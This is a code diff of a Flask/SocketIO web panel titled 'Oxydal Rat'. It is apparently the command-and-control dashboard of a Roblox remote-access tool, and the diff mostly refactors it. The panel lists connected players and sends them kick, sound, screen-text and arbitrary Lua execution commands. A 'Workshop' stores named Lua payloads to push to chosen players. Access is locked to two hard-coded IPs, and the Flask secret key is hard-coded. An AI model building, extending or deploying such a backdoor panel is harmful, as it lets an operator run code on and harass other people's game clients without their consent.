@@ -12,15 +12,19 @@ app = Flask(__name__)
 app.config["SECRET_KEY"] = "super_secret_key_change_me_123456"
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")
 
+# === IPs autorisées ===
 ALLOWED_IPS = {"37.66.149.36", "91.170.86.224"}
+
+# === Fichiers ===
 HISTORY_FILE = "history_log.json"
 PAYLOADS_FILE = "payloads.json"
 
+# === Variables globales ===
 connected_players = {}
 pending_kicks = {}
 pending_commands = {}
 history_log = []
-payloads = {}  # { "nom_du_payload": "le code lua" }
+payloads = {}  # { "nom_payload": "code lua" }
 
 # === Chargement des données ===
 def load_history():
@@ -29,7 +33,8 @@ def load_history():
         try:
             with open(HISTORY_FILE, 'r', encoding='utf-8') as f:
                 history_log = json.load(f)
-        except: history_log = []
+        except:
+            history_log = []
 
 def load_payloads():
     global payloads
@@ -37,18 +42,20 @@ def load_payloads():
         try:
             with open(PAYLOADS_FILE, 'r', encoding='utf-8') as f:
                 payloads = json.load(f)
-        except: payloads = {}
+        except:
+            payloads = {}
 
 def save_payloads():
     try:
         with open(PAYLOADS_FILE, 'w', encoding='utf-8') as f:
             json.dump(payloads, f, ensure_ascii=False, indent=2)
-    except: pass
+    except:
+        pass
 
 load_history()
 load_payloads()
 
-# === Sécurité & historique ===
+# === Sécurité IP ===
 def check_ip():
     ip = request.headers.get("X-Forwarded-For", request.remote_addr)
     if ip and "," in ip:
@@ -70,27 +77,32 @@ def access_denied(e):
 
 @app.before_request
 def protect_routes():
-    if request.path in ["/", "/kick", "/troll", "/payload"]:
+    if request.path in ["/", "/kick", "/troll", "/payload"] or request.path.startswith("/api"):
         check_ip()
 
+# === Historique ===
 def add_history(event_type, username, details=""):
     timestamp = datetime.now().strftime("%H:%M:%S")
     history_log.insert(0, {"time": timestamp, "type": event_type, "username": username, "details": details})
-    if len(history_log) > 100: history_log.pop()
-    with open(HISTORY_FILE, 'w', encoding='utf-8') as f:
-        json.dump(history_log, f, ensure_ascii=False, indent=2)
+    if len(history_log) > 100:
+        history_log.pop()
+    try:
+        with open(HISTORY_FILE, 'w', encoding='utf-8') as f:
+            json.dump(history_log, f, ensure_ascii=False, indent=2)
+    except:
+        pass
     socketio.emit("history_update", {"history": history_log[:50]})
 
-# === HTML avec Workshop ===
+# === Page principale ===
 HTML = """<!DOCTYPE html>
 <html lang="en" class="dark">
 <head>
 <meta charset="UTF-8">
-<title>Oxydal Rat — Wave Theme + Workshop</title>
+<title>Oxydal Rat — Wave Theme</title>
 <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono&display=swap" rel="stylesheet">
 <style>
-    :root {--bg:#0f172a;--card:#1e293b;--border:#334155;--primary:#06b6d4;--primary-hover:#0891b2;--text:#e2e8f0;--text-muted:#94a3b8;}
+    :root{--bg:#0f172a;--card:#1e293b;--border:#334155;--primary:#06b6d4;--primary-hover:#0891b2;--text:#e2e8f0;--text-muted:#94a3b8;}
     *{margin:0;padding:0;box-sizing:border-box;}
     body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;display:flex;}
     .header{position:fixed;top:0;left:0;right:0;height:70px;background:rgba(15,23,42,0.95);backdrop-filter:blur(12px);border-bottom:1px solid var(--border);z-index:1000;display:flex;align-items:center;padding:0 2rem;justify-content:space-between;}
@@ -121,8 +133,7 @@ HTML = """<!DOCTYPE html>
     .btn{padding:10px;border:none;border-radius:10px;font-weight:600;font-size:.8rem;cursor:pointer;transition:all .3s;color:white;
          background:linear-gradient(135deg,#06b6d4,#0891b2);box-shadow:0 4px 15px rgba(6,182,212,.3);}
     .btn:hover{transform:translateY(-4px);box-shadow:0 10px 25px rgba(6,182,212,.5);}
-    .btn.kick{background:linear-gradient(135deg,#ef4444,#dc2626);box-shadow:0 4px 15px rgba(239,68,68,.4);}
-    .btn.kick:hover{box-shadow:0 10px 25px rgba(239,68,68,.6);}
+    .btn.kick{background:linear-gradient(135deg,#ef4444,#dc2626);}
     .btn.undo{background:#475569;}
     .modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,.9);z-index:2000;align-items:center;justify-content:center;}
     .modal.active{display:flex;}
@@ -132,13 +143,12 @@ HTML = """<!DOCTYPE html>
     .modal-buttons{display:flex;gap:1rem;}
     .modal-btn{flex:1;padding:14px;border:none;border-radius:12px;font-weight:600;cursor:pointer;transition:all .3s;}
     .confirm{background:var(--primary);color:white;}
-    .confirm:hover{background:var(--primary-hover);transform:translateY(-3px);box-shadow:0 10px 25px rgba(6,182,212,.5);}
+    .confirm:hover{background:var(--primary-hover);transform:translateY(-3px);}
     .cancel{background:#475569;color:white;}
     .toast-container{position:fixed;bottom:20px;right:20px;z-index:9999;}
     .toast{background:var(--card);border-left:5px solid var(--primary);padding:1rem 1.5rem;margin-top:1rem;border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,.6);animation:slideIn .4s;}
     @keyframes slideIn{from{transform:translateX(100%)}to{transform:translateX(0)}}
     .payload-item{background:var(--card);padding:1rem;border-radius:12px;margin-bottom:1rem;border-left:4px solid var(--primary);display:flex;justify-content:space-between;align-items:center;}
-    .payload-actions button{margin-left:5px;padding:6px 10px;font-size:0.8rem;}
 </style>
 </head>
 <body>
@@ -153,48 +163,29 @@ HTML = """<!DOCTYPE html>
 
 <div class="main">
     <div class="sidebar">
-        <div class="nav-item active" onclick="switchTab('players')">Players</div>
-        <div class="nav-item" onclick="switchTab('workshop')">Workshop</div>
-        <div class="nav-item" onclick="switchTab('history')">History</div>
+        <div class="nav-item active" data-tab="players">Players</div>
+        <div class="nav-item" data-tab="workshop">Workshop</div>
+        <div class="nav-item" data-tab="history">History</div>
     </div>
 
     <div class="content">
         <div id="players-tab" class="tab active"><div class="grid" id="players"></div></div>
         <div id="workshop-tab" class="tab" style="display:none;">
-            <button class="btn" style="margin-bottom:20px;" onclick="openCreatePayload()">+ New Payload</button>
+            <button class="btn" style="margin-bottom:20px;" id="newPayloadBtn">+ New Payload</button>
             <div id="payloads-list"></div>
         </div>
         <div id="history-tab" class="tab" style="display:none;"><div id="history"></div></div>
     </div>
 </div>
 
-<!-- Tous les modals classiques + nouveaux -->
-<div class="modal" id="kickModal"><div class="modal-content"><h2>Kick Player</h2><input type="text" id="kickReason" placeholder="Reason (optional)" autofocus><div class="modal-buttons"><button class="modal-btn cancel" id="cancelKick">Cancel</button><button class="modal-btn confirm" id="confirmKick">Confirm Kick</button></div></div></div>
-<div class="modal" id="playSoundModal"><div class="modal-content"><h2>Play Sound</h2><input type="text" id="soundAssetId" placeholder="Enter Asset ID" autofocus><div class="modal-buttons"><button class="modal-btn cancel" id="cancelSound">Cancel</button><button class="modal-btn confirm" id="confirmSound">Play</button></div></div></div>
-<div class="modal" id="textScreenModal"><div class="modal-content"><h2>Display Text Screen</h2><input type="text" id="screenText" placeholder="Enter text" autofocus><div class="modal-buttons"><button class="modal-btn cancel" id="cancelText">Cancel</button><button class="modal-btn confirm" id="confirmText">Display</button></div></div></div>
-<div class="modal" id="luaExecModal"><div class="modal-content"><h2>Execute Lua Script</h2><textarea id="luaScript" placeholder="Enter Lua code" style="height:180px;"></textarea><div class="modal-buttons"><button class="modal-btn cancel" id="cancelLua">Cancel</button><button class="modal-btn confirm" id="confirmLua">Execute</button></div></div></div>
-<div class="modal" id="importFileModal"><div class="modal-content"><h2>Import Lua File</h2><input type="file" id="luaFileInput" accept=".lua,.txt" style="padding:1rem;background:#0f172a;border:2px dashed var(--primary);border-radius:12px;cursor:pointer;"><div class="modal-buttons"><button class="modal-btn cancel" id="cancelImport">Cancel</button><button class="modal-btn confirm" id="confirmImport">Execute File</button></div></div></div>
-
-<!-- Nouveau modal Payload -->
-<div class="modal" id="payloadModal"><div class="modal-content">
-    <h2 id="payloadModalTitle">Create Payload</h2>
-    <input type="text" id="payloadName" placeholder="Payload name">
-    <textarea id="payloadCode" placeholder="Lua code..." style="height:200px;"></textarea>
-    <div class="modal-buttons">
-        <button class="modal-btn cancel" onclick="document.getElementById('payloadModal').classList.remove('active')">Cancel</button>
-        <button class="modal-btn confirm" id="savePayload">Save</button>
-    </div>
-</div></div>
-
-<!-- Modal sélection payload -->
-<div class="modal" id="selectPayloadModal"><div class="modal-content">
-    <h2>Select Payload to Execute</h2>
-    <select id="payloadSelect" size="10" style="height:300px;"></select>
-    <div class="modal-buttons">
-        <button class="modal-btn cancel" onclick="document.getElementById('selectPayloadModal').classList.remove('active')">Cancel</button>
-        <button class="modal-btn confirm" id="executeSelectedPayload">Execute Selected</button>
-    </div>
-</div></div>
+<!-- Modals -->
+<div class="modal" id="kickModal"><div class="modal-content"><h2>Kick Player</h2><input type="text" id="kickReason" placeholder="Reason (optional)" autofocus><div class="modal-buttons"><button class="modal-btn cancel">Cancel</button><button class="modal-btn confirm" id="confirmKick">Confirm Kick</button></div></div></div>
+<div class="modal" id="playSoundModal"><div class="modal-content"><h2>Play Sound</h2><input type="text" id="soundAssetId" placeholder="Enter Asset ID" autofocus><div class="modal-buttons"><button class="modal-btn cancel">Cancel</button><button class="modal-btn confirm" id="confirmSound">Play</button></div></div></div>
+<div class="modal" id="textScreenModal"><div class="modal-content"><h2>Display Text Screen</h2><input type="text" id="screenText" placeholder="Enter text" autofocus><div class="modal-buttons"><button class="modal-btn cancel">Cancel</button><button class="modal-btn confirm" id="confirmText">Display</button></div></div></div>
+<div class="modal" id="luaExecModal"><div class="modal-content"><h2>Execute Lua Script</h2><textarea id="luaScript" placeholder="Enter Lua code" style="height:180px;"></textarea><div class="modal-buttons"><button class="modal-btn cancel">Cancel</button><button class="modal-btn confirm" id="confirmLua">Execute</button></div></div></div>
+<div class="modal" id="importFileModal"><div class="modal-content"><h2>Import Lua File</h2><input type="file" id="luaFileInput" accept=".lua,.txt" style="padding:1rem;background:#0f172a;border:2px dashed var(--primary);border-radius:12px;cursor:pointer;"><div class="modal-buttons"><button class="modal-btn cancel">Cancel</button><button class="modal-btn confirm" id="confirmImport">Execute File</button></div></div></div>
+<div class="modal" id="payloadModal"><div class="modal-content"><h2 id="payloadModalTitle">Create Payload</h2><input type="text" id="payloadName" placeholder="Payload name"><textarea id="payloadCode" placeholder="Lua code..." style="height:200px;"></textarea><div class="modal-buttons"><button class="modal-btn cancel">Cancel</button><button class="modal-btn confirm" id="savePayload">Save</button></div></div></div>
+<div class="modal" id="selectPayloadModal"><div class="modal-content"><h2>Select Payload to Execute</h2><select id="payloadSelect" size="10" style="height:300px;"></select><div class="modal-buttons"><button class="modal-btn cancel">Cancel</button><button class="modal-btn confirm" id="executeSelectedPayload">Execute Selected</button></div></div></div>
 
 <div class="toast-container" id="toasts"></div>
 
@@ -203,123 +194,109 @@ const socket = io();
 let currentKickId = null, currentSoundId = null, currentTextId = null, currentLuaId = null, currentImportId = null;
 let editingPayload = null;
 
-function switchTab(tab) {
-    document.querySelectorAll('.tab').forEach(t => t.style.display = 'none');
-    document.querySelectorAll('.nav-item').forEach(b => b.classList.remove('active'));
-    document.getElementById(tab + '-tab').style.display = 'block';
-    document.querySelector(`.nav-item[onclick="switchTab('${tab}')"]`).classList.add('active');
-    if (tab === 'workshop') loadPayloads();
-}
+// Navigation
+document.querySelectorAll('.nav-item').forEach(item => {
+    item.addEventListener('click', () => {
+        document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
+        document.querySelectorAll('.tab').forEach(t => t.style.display = 'none');
+        item.classList.add('active');
+        document.getElementById(item.dataset.tab + '-tab').style.display = 'block';
+        if (item.dataset.tab === 'workshop') loadPayloads();
+    });
+});
 
 function toast(msg) {
-    const t = document.createElement("div"); t.className = "toast"; t.textContent = msg;
+    const t = document.createElement("div");
+    t.className = "toast";
+    t.textContent = msg;
     document.getElementById("toasts").appendChild(t);
     setTimeout(() => t.remove(), 4000);
 }
 
-// === Gestion Payloads ===
+// Workshop
 function loadPayloads() {
     fetch("/payload?action=list").then(r => r.json()).then(data => {
         const list = document.getElementById("payloads-list");
-        list.innerHTML = "";
-        if (Object.keys(data).length === 0) {
-            list.innerHTML = "<p style='color:#94a3b8'>No payload yet. Create one!</p>";
-            return;
-        }
+        list.innerHTML = Object.keys(data).length === 0 ? "<p style='color:#94a3b8'>No payload yet. Create one!</p>" : "";
         for (const [name, code] of Object.entries(data)) {
             const div = document.createElement("div");
             div.className = "payload-item";
-            div.innerHTML = `
-                <div><strong>${name}</strong><br><span style="font-size:0.8rem;color:#94a3b8">${code.substring(0,80)}${code.length>80?"...":""}</span></div>
-                <div class="payload-actions">
-                    <button class="btn" style="padding:6px 12px;font-size:0.75rem" onclick="editPayload('${name}')">Edit</button>
-                    <button class="btn kick" style="padding:6px 12px;font-size:0.75rem" onclick="deletePayload('${name}')">Delete</button>
-                </div>
-            `;
+            div.innerHTML = `<div><strong>${name}</strong><br><span style="font-size:0.8rem;color:#94a3b8">${code.substring(0,80)}${code.length>80?"...":""}</span></div>
+                <div><button class="btn" style="padding:6px 12px;font-size:0.75rem;margin:0 4px" onclick="editPayload('${name}')">Edit</button>
+                <button class="btn kick" style="padding:6px 12px;font-size:0.75rem;margin:0 4px" onclick="deletePayload('${name}')">Delete</button></div>`;
             list.appendChild(div);
         }
     });
 }
 
-function openCreatePayload() {
+document.getElementById("newPayloadBtn").addEventListener("click", () => {
     editingPayload = null;
     document.getElementById("payloadModalTitle").textContent = "Create Payload";
     document.getElementById("payloadName").value = "";
     document.getElementById("payloadCode").value = "";
     document.getElementById("payloadModal").classList.add("active");
-}
+});
 
-function editPayload(name) {
-    fetch("/payload?action=get&name=" + encodeURIComponent(name))
-        .then(r => r.json())
-        .then(data => {
-            editingPayload = name;
-            document.getElementById("payloadModalTitle").textContent = "Edit Payload";
-            document.getElementById("payloadName").value = name;
-            document.getElementById("payloadCode").value = data.code;
-            document.getElementById("payloadModal").classList.add("active");
-        });
-}
+window.editPayload = function(name) {
+    fetch("/payload?action=get&name=" + encodeURIComponent(name)).then(r => r.json()).then(d => {
+        editingPayload = name;
+        document.getElementById("payloadModalTitle").textContent = "Edit Payload";
+        document.getElementById("payloadName").value = name;
+        document.getElementById("payloadCode").value = d.code;
+        document.getElementById("payloadModal").classList.add("active");
+    });
+};
 
-function deletePayload(name) {
-    if (!confirm("Delete payload " + name + " ?")) return;
-    fetch("/payload", {method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({action:"delete",name}})}
-        .then(() => { toast("Payload deleted"); loadPayloads(); });
-}
+window.deletePayload = function(name) {
+    if (confirm("Delete payload " + name + " ?")) {
+        fetch("/payload", {method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({action:"delete",name})})
+            .then(() => { toast("Payload deleted"); loadPayloads(); });
+    }
+};
 
-document.getElementById("savePayload").onclick = () => {
+document.getElementById("savePayload").addEventListener("click", () => {
     const name = document.getElementById("payloadName").value.trim();
     const code = document.getElementById("payloadCode").value;
     if (!name || !code) return toast("Name and code required");
-    const body = {action: editingPayload ? "update" : "create", name, code, oldname: editingPayload};
-    fetch("/payload", {method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(body)})
-        .then(() => {
-            toast(editingPayload ? "Payload updated" : "Payload created");
-            document.getElementById("payloadModal").classList.remove("active");
-            loadPayloads();
-        });
-};
+    fetch("/payload", {method:"POST",headers:{"Content-Type":"application/json"},
+        body: JSON.stringify({action: editingPayload ? "update" : "create", name, code, oldname: editingPayload})
+    }).then(() => {
+        toast(editingPayload ? "Payload updated" : "Payload created");
+        document.getElementById("payloadModal").classList.remove("active");
+        loadPayloads();
+    });
+});
 
-// Sélection & exécution payload
-function openPayloadSelector(id) {
+window.openPayloadSelector = function(id) {
     currentLuaId = id;
     fetch("/payload?action=list").then(r => r.json()).then(data => {
-        const select = document.getElementById("payloadSelect");
-        select.innerHTML = "";
-        if (Object.keys(data).length === 0) {
-            select.innerHTML = "<option>No payload available</option>";
-            return;
-        }
-        for (const name of Object.keys(data)) {
-            const opt = document.createElement("option");
-            opt.value = name;
-            opt.textContent = name;
-            select.appendChild(opt);
+        const sel = document.getElementById("payloadSelect");
+        sel.innerHTML = "";
+        if (Object.keys(data).length === 0) sel.innerHTML = "<option>No payload</option>";
+        else for (const n of Object.keys(data)) {
+            const opt = document.createElement("option"); opt.value = n; opt.textContent = n; sel.appendChild(opt);
         }
         document.getElementById("selectPayloadModal").classList.add("active");
     });
-}
-
-document.getElementById("executeSelectedPayload").onclick = () => {
-    const name = document.getElementById("payloadSelect").value;
-    if (!name) return;
-    fetch("/payload?action=get&name=" + encodeURIComponent(name))
-        .then(r => r.json())
-        .then(data => {
-            sendTroll(currentLuaId, "luaexec", data.code);
-            document.getElementById("selectPayloadModal").classList.remove("active");
-        });
 };
 
-// === Fonctions classiques ===
+document.getElementById("executeSelectedPayload").addEventListener("click", () => {
+    const name = document.getElementById("payloadSelect").value;
+    if (!name) return;
+    fetch("/payload?action=get&name=" + encodeURIComponent(name)).then(r => r.json()).then(d => {
+        sendTroll(currentLuaId, "luaexec", d.code);
+        document.getElementById("selectPayloadModal").classList.remove("active");
+    });
+});
+
+// Fonctions classiques
 function openKickModal(id){currentKickId=id;document.getElementById("kickModal").classList.add("active");document.getElementById("kickReason").focus();}
 function openPlaySoundModal(id){currentSoundId=id;document.getElementById("playSoundModal").classList.add("active");}
 function openTextScreenModal(id){currentTextId=id;document.getElementById("textScreenModal").classList.add("active");}
 function openLuaExecModal(id){currentLuaId=id;document.getElementById("luaExecModal").classList.add("active");}
 function openImportFileModal(id){currentImportId=id;document.getElementById("importFileModal").classList.add("active");}
 
-function closeModal(id){document.getElementById(id).classList.remove("active");}
-document.querySelectorAll('.cancel').forEach(b=>b.onclick=()=>closeModal(b.closest('.modal').id));
+document.querySelectorAll('.modal .cancel').forEach(b => b.addEventListener("click", () => b.closest('.modal').classList.remove("active")));
 
 function sendTroll(id,cmd,param=null){
     const body={userid:id,cmd};
@@ -328,17 +305,17 @@ function sendTroll(id,cmd,param=null){
     toast(cmd.toUpperCase()+" sent");
 }
 
-document.getElementById("confirmKick").onclick=()=>{const r=document.getElementById("kickReason").value.trim()||"Kicked by admin";fetch("/kick",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userid:currentKickId,reason:r})});toast("KICK sent","danger");closeModal("kickModal");};
-document.getElementById("confirmSound").onclick=()=>{const a=document.getElementById("soundAssetId").value.trim();if(a)sendTroll(currentSoundId,"playsound",a);closeModal("playSoundModal");};
-document.getElementById("confirmText").onclick=()=>{const t=document.getElementById("screenText").value.trim();if(t)sendTroll(currentTextId,"textscreen",t);closeModal("textScreenModal");};
-document.getElementById("confirmLua").onclick=()=>{const s=document.getElementById("luaScript").value.trim();if(s)sendTroll(currentLuaId,"luaexec",s);closeModal("luaExecModal");};
-document.getElementById("confirmImport").onclick=()=>{
+document.getElementById("confirmKick").addEventListener("click",()=>{const r=document.getElementById("kickReason").value.trim()||"Kicked by admin";fetch("/kick",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userid:currentKickId,reason:r})});toast("KICK sent");document.getElementById("kickModal").classList.remove("active");});
+document.getElementById("confirmSound").addEventListener("click",()=>{const a=document.getElementById("soundAssetId").value.trim();if(a)sendTroll(currentSoundId,"playsound",a);document.getElementById("playSoundModal").classList.remove("active");});
+document.getElementById("confirmText").addEventListener("click",()=>{const t=document.getElementById("screenText").value.trim();if(t)sendTroll(currentTextId,"textscreen",t);document.getElementById("textScreenModal").classList.remove("active");});
+document.getElementById("confirmLua").addEventListener("click",()=>{const s=document.getElementById("luaScript").value.trim();if(s)sendTroll(currentLuaId,"luaexec",s);document.getElementById("luaExecModal").classList.remove("active");});
+document.getElementById("confirmImport").addEventListener("click",()=>{
     const f=document.getElementById("luaFileInput").files[0];
-    if(!f)return toast("Select a file","danger");
+    if(!f)return toast("Select a file");
     const r=new FileReader();
-    r.onload=e=>{sendTroll(currentImportId,"luaexec",e.target.result);closeModal("importFileModal");document.getElementById("luaFileInput").value="";};
+    r.onload=e=>{sendTroll(currentImportId,"luaexec",e.target.result);document.getElementById("importFileModal").classList.remove("active");document.getElementById("luaFileInput").value="";};
     r.readAsText(f);
-};
+});
 
 function render(data){
     document.getElementById("stats").innerText=data.online;
@@ -387,51 +364,17 @@ function render(data){
 }
 
 function renderHistory(data){
-    document.getElementById("history").innerHTML = data.history.map(h=>`
-        <div class="payload-item"><strong>[${h.time}] ${h.username}</strong><br><span style="color:#94a3b8">${h.details}</span></div>
-    `).join('');
+    document.getElementById("history").innerHTML = data.history.map(h=>`<div class="payload-item"><strong>[${h.time}] ${h.username}</strong><br><span style="color:#94a3b8">${h.details}</span></div>`).join('');
 }
 
 socket.on("update", render);
 socket.on("history_update", renderHistory);
-socket.on("kick_notice", d => toast(d.username + " → " + d.reason, "danger"));
+socket.on("kick_notice", d => toast(d.username + " → " + d.reason));
 fetch("/get_history").then(r=>r.json()).then(renderHistory);
 </script>
 </body>
 </html>"""
 
-# === Nouvelle route Payload ===
-@app.route("/payload", methods=["GET", "POST"])
-def payload_manager():
-    check_ip()
-    if request.method == "GET":
-        action = request.args.get("action")
-        if action == "list":
-            return jsonify(payloads)
-        if action == "get":
-            name = request.args.get("name")
-            return jsonify({"code": payloads.get(name, "")})
-    else:
-        data = request.get_json() or {}
-        action = data.get("action")
-        if action == "create":
-            payloads[data["name"]] = data["code"]
-            save_payloads()
-            return jsonify({"ok": True})
-        if action == "update":
-            if data["oldname"] in payloads:
-                del payloads[data["oldname"]]
-            payloads[data["name"]] = data["code"]
-            save_payloads()
-            return jsonify({"ok": True})
-        if action == "delete":
-            if data["name"] in payloads:
-                del payloads[data["name"]]
-                save_payloads()
-            return jsonify({"ok": True})
-    return jsonify({"error": "invalid"})
-
-# === Routes classiques inchangées ===
 @app.route("/")
 def index():
     return render_template_string(HTML)
@@ -513,6 +456,31 @@ def troll():
         socketio.emit("kick_notice", {"username": name, "reason": cmd.upper()})
     return jsonify({"sent": True})
 
+@app.route("/payload", methods=["GET", "POST"])
+def payload_manager():
+    check_ip()
+    if request.method == "GET":
+        action = request.args.get("action")
+        if action == "list":
+            return jsonify(payloads)
+        if action == "get":
+            name = request.args.get("name")
+            return jsonify({"code": payloads.get(name, "")})
+    else:
+        data = request.get_json() or {}
+        action = data.get("action")
+        if action == "create":
+            payloads[data["name"]] = data["code"]
+        elif action == "update":
+            if data.get("oldname") in payloads:
+                del payloads[data["oldname"]]
+            payloads[data["name"]] = data["code"]
+        elif action == "delete":
+            payloads.pop(data.get("name"), None)
+        save_payloads()
+        return jsonify({"ok": True})
+    return jsonify({"error": "invalid"})
+
 def broadcast_loop():
     while True:
         now = time.time()
@@ -534,6 +502,5 @@ def broadcast_loop():
         socketio.sleep(2)
 
 if __name__ == "__main__":
-    load_history()
     socketio.start_background_task(broadcast_loop)
     socketio.run(app, host="0.0.0.0", port=5000)
